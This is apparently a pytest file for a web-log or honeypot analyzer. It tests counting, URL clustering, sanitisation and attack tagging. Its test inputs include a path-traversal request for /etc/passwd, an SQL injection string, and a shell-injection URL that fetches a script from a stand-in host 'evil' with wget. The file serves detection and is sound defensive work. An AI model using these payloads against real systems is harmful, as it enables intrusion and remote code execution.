"""Tests for the analyzer module."""

import json
from pathlib import Path

from analyze import analyze, SchemaSummary, _sanitize_string, _classify_url, _detect_attacks

FIXTURES = Path(__file__).parent / "fixtures"


def _load_fixture(name: str = "sample_logs.jsonl") -> list[dict]:
    entries = []
    with open(FIXTURES / name) as f:
        for line in f:
            line = line.strip()
            if line:
                entries.append(json.loads(line))
    return entries


def test_basic_counts():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    assert summary.total_entries == 12
    assert summary.unique_ips > 0
    assert summary.unique_urls > 0


def test_attack_tags_detected():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    tags = summary.attack_tags
    assert "path_traversal" in tags
    assert "credential_access" in tags  # .env
    assert "wordpress" in tags
    assert "cloud_metadata" in tags  # 169.254.169.254
    assert "phpunit_rce" in tags
    assert "iot_exploit" in tags  # GponForm


def test_url_clustering():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    clusters = summary.url_clusters
    assert "WordPress" in clusters
    assert "path traversal" in clusters
    assert "env/credential files" in clusters


def test_methods_breakdown():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    assert "GET" in summary.methods
    assert "POST" in summary.methods
    assert summary.methods["GET"] == 10
    assert summary.methods["POST"] == 2


def test_entries_with_body():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    assert summary.entries_with_body == 2  # the two POSTs have data


def test_time_buckets():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    assert len(summary.time_buckets) >= 1
    # All entries are in 10:xx and 11:xx, bucketed hourly
    assert "2026-03-16T10:00" in summary.time_buckets
    assert "2026-03-16T11:00" in summary.time_buckets


def test_signature_hits():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    assert "7" in summary.signature_hits  # index page
    assert "3" in summary.signature_hits  # WordPress login
    assert summary.signature_comments.get("3") == "WordPress login"


def test_target_ports():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    assert "8080" in summary.target_ports
    assert "80" in summary.target_ports
    assert "443" in summary.target_ports


def test_top_n_sanitized():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    for url, count in summary.top_urls:
        assert len(url) <= 63  # 60 + "..."
        # No non-printable chars
        for ch in url:
            assert 0x20 <= ord(ch) <= 0x7e


def test_structural_hash_stability():
    entries = _load_fixture()
    s1 = analyze(iter(entries), "2026-03-16", "2026-03-16")
    s2 = analyze(iter(entries), "2026-03-16", "2026-03-16")
    assert s1.structural_hash() == s2.structural_hash()


def test_to_json_roundtrip():
    entries = _load_fixture()
    summary = analyze(iter(entries), "2026-03-16", "2026-03-16")
    j = summary.to_json()
    parsed = json.loads(j)
    assert parsed["total_entries"] == 12
    assert isinstance(parsed["attack_tags"], dict)


def test_sanitize_string():
    assert _sanitize_string("hello") == "hello"
    assert len(_sanitize_string("x" * 100, 40)) <= 43  # 40 + "..."
    assert _sanitize_string("abc\x00\x01def") == "abcdef"
    assert _sanitize_string("") == ""


def test_classify_url():
    assert _classify_url("/wp-login.php") == "WordPress"
    assert _classify_url("/.env") == "env/credential files"
    assert _classify_url("/random/page") == "other"
    assert _classify_url("/cgi-bin/foo") == "CGI scripts"


def test_detect_attacks_path_traversal():
    entry = {"url": "/../../etc/passwd", "data": "", "useragent": ""}
    tags = _detect_attacks(entry)
    assert "path_traversal" in tags


def test_detect_attacks_sqli():
    entry = {"url": "/search?q=' OR 1=1 --", "data": "", "useragent": ""}
    tags = _detect_attacks(entry)
    assert "sqli" in tags


def test_detect_attacks_shell_injection():
    entry = {"url": "/cgi-bin/foo;wget http://evil/shell.sh", "data": "", "useragent": ""}
    tags = _detect_attacks(entry)
    assert "shell_injection" in tags


def test_empty_input():
    summary = analyze(iter([]), "2026-03-16", "2026-03-16")
    assert summary.total_entries == 0
    assert summary.unique_ips == 0
    assert len(summary.attack_tags) == 0
